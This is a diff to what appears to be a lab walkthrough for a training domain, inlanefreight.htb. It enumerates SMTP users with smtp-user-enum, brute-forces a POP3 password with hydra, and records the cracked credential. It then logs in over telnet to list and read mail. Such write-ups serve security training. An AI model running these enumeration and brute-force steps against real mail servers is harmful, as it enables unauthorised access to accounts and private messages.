@@ -102,7 +102,17 @@ What is the available username for the domain inlanefreight.htb in the SMTP serv
 ```bash
 
 smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.156.13
+# marlin@inlanefreight.htb
 
+hydra -l marlin@inlanefreight.htb -P pws.list pop3//10.129.203.12 -w 60
+# login: marlin@inlanefreight.htb   password: poohbear
+
+telnet 10.129.203.12 110
+
+ USER marlin@inlanefreight.htb
+ PASS poohbear
+ list
+ retr 1
 
 ```
 
